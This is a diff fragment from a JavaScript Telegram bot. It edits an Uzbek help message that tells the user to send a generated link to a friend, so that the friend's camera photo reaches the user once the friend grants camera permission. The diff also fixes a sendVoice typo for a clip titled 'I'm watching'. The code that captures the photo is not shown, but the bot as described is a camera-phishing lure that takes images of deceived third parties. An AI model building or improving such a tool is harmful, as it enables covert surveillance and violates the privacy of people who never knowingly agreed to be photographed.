@@ -80,13 +80,14 @@ bot.on("message", (msg) => {
       }
     );
   }
-
   if (text === "🆘 Yordam") {
     bot.sendMessage(
       chatId,
-      "Shunchaki 📸 Rasm olish tugmasni bosing va berilgan linkni dostingizga jonating. Agar dostingiz linkga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'g'ri yo'lda foydalaning."
+      "Shunchaki 📸 *Rasm olish* tugmasini bosing va berilgan linkni do‘stingizga yuboring.\n\nAgar do‘stingiz linkga kirib kamera ruxsatiga rozilik bildirsa, sizga uning rasmi yuboriladi.\n\n⚠️ Faqat to‘g‘ri yo‘lda foydalaning.",
+      { parse_mode: "Markdown" }
     );
-    bot.sentVoice(chatId, "music/koryapman.ogg");
+
+    bot.sendVoice(chatId, "music/koryapman.ogg");
   }
 });
 
